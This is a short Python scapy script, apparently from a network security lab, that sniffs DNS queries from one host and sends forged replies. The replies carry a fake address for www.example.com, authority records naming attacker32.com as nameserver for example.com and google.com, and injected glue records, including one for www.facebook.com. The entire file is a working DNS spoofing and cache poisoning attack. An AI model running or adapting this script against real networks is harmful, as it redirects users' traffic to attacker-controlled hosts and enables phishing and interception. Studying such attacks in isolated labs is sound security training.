 #!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
	# print pkt.show()
	if(DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname):	
		# swap the source and destination IP address
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		print IPpkt.show()
		
		# Swap the source and destination port number
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
		print UDPpkt.show()

		# The Answer Section
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata = '10.0.2.5')

		# The Authority Section
		NSsec1 = DNSRR(rrname='example.com',type='NS',ttl=259200,rdata='attacker32.com')
		NSsec2 = DNSRR(rrname='google.com',type='NS',ttl=259200,rdata='attacker32.com')

		# The Additional Section
		Addsec1 = DNSRR(rrname='attacker32.com',type='A',ttl=259200,rdata='1.2.3.4')
		Addsec2 = DNSRR(rrname='ns2.example.net',type='A',ttl=259200,rdata='5.6.7.8')
		Addsec3 = DNSRR(rrname='www.facebook.com',type='A',ttl=259200,rdata='3.4.5.6')

		#Construct the DNS packet
		DNSpkt = DNS(id=pkt[DNS].id,qd = pkt[DNS].qd,aa=1,rd=0,qr=1,qdcount=1,ancount=1,nscount=2,arcount=3,an=Anssec,ns=NSsec2/NSsec1,ar=Addsec2/Addsec1/Addsec3)

		# Construt the entire IP packet and send it out
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		spoofpkt.show()
		send(spoofpkt)


# sniff UDP query packets and invoke spoof_dns()
pkt = sniff(filter='udp and dst port 53 and src host 10.0.2.6',prn=spoof_dns)
